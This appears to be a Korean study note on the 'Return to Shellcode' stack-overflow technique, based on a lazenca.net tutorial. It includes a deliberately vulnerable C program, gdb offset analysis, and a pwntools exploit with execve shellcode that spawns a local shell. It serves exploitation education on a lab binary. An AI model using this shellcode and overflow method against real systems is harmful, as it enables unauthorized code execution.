<h1>Return to Shellcode</h1>
Return to Shellcode란 Return address 영역을 Shellcode가 저장된 주소로 변경해서 Shellcode를 호출하는 것이다.

<h3>Call & Ret instruction</h3>
call : Return address를 stack에 저장하고, 피연산자 주소로 이동
ret  : POP을 이용해 RSP가 가리키는 Stack에 저장된 값을 RIP에 저장, 그리고 난 뒤 해당 주소로 이동

![image](https://user-images.githubusercontent.com/62539341/82208408-6cc79100-9946-11ea-9878-dd10eeb74fe8.png)

<h3>Permissions in memory</h3>

- r(read)   : 메모리 영역의 값을 읽기
- w(write)  : 메모리 영역의 값을 쓰기
- x(excute) : 메모리 영역에서 코드를 실행

<b>즉, Shellcode를 실행하기 위해선? excute 권한이 있어야 한다!</b>

gcc는 기본적으로 DEP가 적용되는데, 이것은 코드가 저장된 영역에만 excute 권한이 있고, 데이터가 저장되는 영역에는 excute 권한이 없다.<br>
따라서 gcc 옵션으로 "-z execstack"를 추가하면 된다.

<h3>Proof of concept</h3>

```cpp
#include <stdio.h>
#include <unistd.h>
 
void vuln(){
    char buf[50];
    printf("buf[50] address : %p\n",buf);
    read(0, buf, 100);
}
 
void main(){
    vuln();
}
```
main()함수는 vuln() 함수를 호출, vuln() 함수는 사용자로부터 100개의 문자를 입력받는다.<br>
이때! buf 변수의 크기는 50 byte. 따라서 Stack Overflow가 발생한다.

- break point를 이렇게 할 것이다.
1. 0x400566 : vuln 함수의 첫번째 명령어
2. 0x400595 : read() 함수 호출
3. 0x40059c : vuln() 함수의 ret 명령어

![image](https://user-images.githubusercontent.com/62539341/82209017-8ae1c100-9947-11ea-8063-d42dbf2faf0d.png)

- Return address 를 확인
  - rsp 가 가리키는 최상위 Stack 메모리는 0x7fffffffe448
  - 이 메모리에 vuln() 함수가 종료되고 난 후 돌아갈 주소 값(0x4005ab)이 저장되어 있다.

![image](https://user-images.githubusercontent.com/62539341/82210295-bebde600-9949-11ea-839f-5427f218d1c9.png)

- buf 변수의 주소 확인
  - buf 변수의 위치는 0x7fffffffe400 이고, Return address 위치와 72 byte 떨어져 있다.
  - 즉, 사용자가 문자를 72개 이상 입력하면, Return address를 덮어쓸 수 있다.

  ![image](https://user-images.githubusercontent.com/62539341/82210550-44419600-994a-11ea-9585-8cd3d2a9bca0.png)

- Return address 값의 변경
  - 0x7fffffffe448 에 0x4a4a4a4a4a4a4a4a(JJJJJJJJ)이 저장되어 있다.
  - 즉, 72개의 문자를 입력 후 shellcode가 저장된 주소를 저장하면 Return address를 덮어 쓸 수 있습니다.

![image](https://user-images.githubusercontent.com/62539341/82210666-705d1700-994a-11ea-90e4-9e1153be378f.png)

<h3>Exploit</h3>

- Exploit code 를 작성

```py
from pwn import *
 
p = process('./poc')
p.recvuntil('buf[50] address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)
 
exploit = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
exploit += "\x90" * (72 - len(exploit))
exploit += p64(stackAddr)
p.send(exploit)
p.interactive()
```

- Exploit code를 실행해서 shell를 획득

```
lazenca0x0@ubuntu:~/Exploit/shellcode$ python exploit.py
[+] Starting local process './test': pid 111702
[*] Switching to interactive mode
$ id
uid=1000(lazenca0x0) gid=1000(lazenca0x0) groups=1000(lazenca0x0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$
```

출처 : http://lazenca.net/display/TEC/02.Return+to+Shellcode